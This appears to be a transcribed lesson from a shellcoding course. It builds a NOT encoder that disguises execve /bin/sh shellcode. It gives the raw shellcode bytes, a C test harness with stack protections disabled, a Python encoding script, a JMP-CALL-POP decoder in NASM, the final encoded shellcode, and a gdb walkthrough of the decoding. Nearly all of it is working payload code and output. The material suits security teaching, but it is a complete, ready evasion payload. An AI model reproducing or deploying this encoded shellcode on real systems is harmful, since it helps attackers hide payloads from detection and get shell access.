#Simple NOT encoder

Hello students! In this video we will take up very first custom 
encoder which is going to be a very simple NOT encoder.

Now, what is a NOT encoder. It transforms every byte in your shellcode
using NOT.

And as you may already guess decoder will `not` the encoded byte to get
the original shellcode byte. Then we will pass control to the original
shellcode bytes after decoding happens.

First, let me copy shellcode we will be using `execve-stack.nasm`.

```
nasm -f elf32 execve-stack.nasm
ld -o execve-stack execve-stack.o
shellcode-dump.sh execve-stack
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Paste it in `shellcode.c`

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

```
$ ./shellcode 
Shellcode Length:  25
$ 
$ 
$ 
```

shellcode works fine. Now, the first thing what I need, of course, is
my NOT encoder. I've written very simple `Encoder.py` file

```py
#!/usr/bin/python

# Python Complement Encoder 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
        # Complement Encoding   
        y = ~x

        encoded += '\\x'
        encoded += '%02x' % (y & 0xff)

        encoded2 += '0x'
        encoded2 += '%02x,' %(y & 0xff)


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
```

and all this does is it complements and then it prints it in format
which we can use. Let's run `Encoder.py`

```
$ ./Encoder.py 
Encoded shellcode ...
\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f
0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f,
Len: 25
```

Now let's check that there are no NULL values in our shellcode.
After that let's write our NOT encoder.

```asm
global _start

section .text
_start:



        EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
```

Now I am going to use JMP-CALL-POP technique to find the address of
our encoded shellcode.

```asm
global _start

section .text
_start:
        jmp short call_shellcode

decoder:

decode:


call_shellcode:

        call decoder
        EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
```

In the `decoder` I want to get the address of `EncodedShellcode`. Let's do this by simple `pop esi`. And now in the `decode` part basically
I want to `not` back to get the original shellcode. Now if you 
remember the length of the shellcode which we had seen was 25.
So let me run the `loop` for which I will use `ecx` register

```
xor ecx, ecx
mov cl, 25
```

And the `decode` part is gonna be very very simple. Just apply `not`

```
not byte [esi]
inc esi
loop decode
```

And after the `loop` we want to jump to decoded shellcode

```
jmp short EncodedShellcode
```

```asm
global _start

section .text
_start:
        jmp short call_shellcode

decoder:
        pop esi
        xor ecx, ecx
        mov cl, 25

decode:
        not byte[esi]
        inc esi
        loop decode

        jmp short EncodedShellcode

call_shellcode:

        call decoder
        EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
```

Let's compile it and get shellcode

```
shellcode-dump.sh not-encoder
"\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f"
```

Let's paste it in `shellcode.c` and compile it

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

```
$ ./shellcode 
Shellcode Length:  44
$ 
$ 
$ 
```

there we go. Let's quickly use gdb to analyze this shellcode

```
gdb -q ./shellcode
```

```
(gdb) set disassembly-flavor intel
(gdb) print/x &code
$1 = 0x804a040
(gdb) break *0x804a040
```

```
(gdb) r
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	jmp    0x804a04e <code+14>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	xor    ecx,ecx
   0x0804a045 <+5>:	mov    cl,0x19
   0x0804a047 <+7>:	not    BYTE PTR [esi]
   0x0804a049 <+9>:	inc    esi
   0x0804a04a <+10>:	loop   0x804a047 <code+7>
   0x0804a04c <+12>:	jmp    0x804a053 <code+19>
   0x0804a04e <+14>:	call   0x804a042 <code+2>
   0x0804a053 <+19>:	into   
   0x0804a054 <+20>:	aas    
   0x0804a055 <+21>:	scas   eax,DWORD PTR es:[edi]
   0x0804a056 <+22>:	xchg   edi,eax
   0x0804a057 <+23>:	rcl    al,1
   0x0804a059 <+25>:	mov    WORD PTR [edi-0x69622f69],ss
   0x0804a05f <+31>:	xchg   ecx,eax
   0x0804a060 <+32>:	jbe    0x804a07e
   0x0804a062 <+34>:	scas   eax,DWORD PTR es:[edi]
   0x0804a063 <+35>:	jbe    0x804a082
   0x0804a065 <+37>:	lods   al,BYTE PTR ds:[esi]
   0x0804a066 <+38>:	jbe    0x804a086
   0x0804a068 <+40>:	dec    edi
   0x0804a069 <+41>:	hlt    
   0x0804a06a <+42>:	xor    bh,BYTE PTR [edi+0x0]
End of assembler dump.
```

Now you can notice we have `jump` here

```
0x0804a040 <+0>: jmp    0x804a04e <code+14>
```

and we have `call` here

```
 0x0804a04e <+14>:    call   0x804a042 <code+2>
```

So after this `call` is our shellcode

```
0x0804a053 <+19>:    into
0x0804a054 <+20>:    aas
0x0804a055 <+21>:    scas   eax,DWORD PTR es:[edi]
0x0804a056 <+22>:    xchg   edi,eax
0x0804a057 <+23>:    rcl    al,1
0x0804a059 <+25>:    mov    WORD PTR [edi-0x69622f69],ss
0x0804a05f <+31>:    xchg   ecx,eax
0x0804a060 <+32>:    jbe    0x804a07e
0x0804a062 <+34>:    scas   eax,DWORD PTR es:[edi]
0x0804a063 <+35>:    jbe    0x804a082
0x0804a065 <+37>:    lods   al,BYTE PTR ds:[esi]
0x0804a066 <+38>:    jbe    0x804a086
0x0804a068 <+40>:    dec    edi
0x0804a069 <+41>:    hlt
0x0804a06a <+42>:    xor    bh,BYTE PTR [edi+0x0]
```

Let's verify this

```
(gdb) shell cat not-encoder.nasm
```

we see there

```
	EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
```

```
(gdb) x/20xb 0x0804a053
0x804a053 <code+19>:	0xce	0x3f	0xaf	0x97	0xd0	0xd0	0x8c	0x97
0x804a05b <code+27>:	0x97	0xd0	0x9d	0x96	0x91	0x76	0x1c	0xaf
0x804a063 <code+35>:	0x76	0x1d	0xac	0x76
```

So what we really want is after this `loop`

```
   0x0804a04a <+10>:	loop   0x804a047 <code+7>
```

I want to look at shellcode byte values and see if it has been
disassembled for my `/bin/sh` shellcode. Now I am going to setup
breakpoint just after `loop` instruction.

```
(gdb) break *0x0804a04c
```

at this point we know that our shellcode has been decoded entirely.
Let's continue

```
(gdb) c
Continuing.
```

```
(gdb) disassemble 
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a04e <code+14>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	xor    ecx,ecx
   0x0804a045 <+5>:	mov    cl,0x19
   0x0804a047 <+7>:	not    BYTE PTR [esi]
   0x0804a049 <+9>:	inc    esi
   0x0804a04a <+10>:	loop   0x804a047 <code+7>
=> 0x0804a04c <+12>:	jmp    0x804a053 <code+19>
   0x0804a04e <+14>:	call   0x804a042 <code+2>
   0x0804a053 <+19>:	xor    eax,eax
   0x0804a055 <+21>:	push   eax
   0x0804a056 <+22>:	push   0x68732f2f
   0x0804a05b <+27>:	push   0x6e69622f
   0x0804a060 <+32>:	mov    ebx,esp
   0x0804a062 <+34>:	push   eax
   0x0804a063 <+35>:	mov    edx,esp
   0x0804a065 <+37>:	push   ebx
   0x0804a066 <+38>:	mov    ecx,esp
   0x0804a068 <+40>:	mov    al,0xb
   0x0804a06a <+42>:	int    0x80
   0x0804a06c <+44>:	add    BYTE PTR [eax],al
End of assembler dump.
```

and as you may see this part

```
   0x0804a053 <+19>:	xor    eax,eax
   0x0804a055 <+21>:	push   eax
   0x0804a056 <+22>:	push   0x68732f2f
   0x0804a05b <+27>:	push   0x6e69622f
   0x0804a060 <+32>:	mov    ebx,esp
   0x0804a062 <+34>:	push   eax
   0x0804a063 <+35>:	mov    edx,esp
   0x0804a065 <+37>:	push   ebx
   0x0804a066 <+38>:	mov    ecx,esp
   0x0804a068 <+40>:	mov    al,0xb
   0x0804a06a <+42>:	int    0x80
   0x0804a06c <+44>:	add    BYTE PTR [eax],al
```

has been entirely decoded to our `/bin/sh` shellcode.

So this is a very very simple technique really but what I want to show
you is that's it. I mean you could get more and more creative and
basically there are two ways: one is you transform your mathematical
function or second is you scramble your shellcode and then have
unscrambling function.


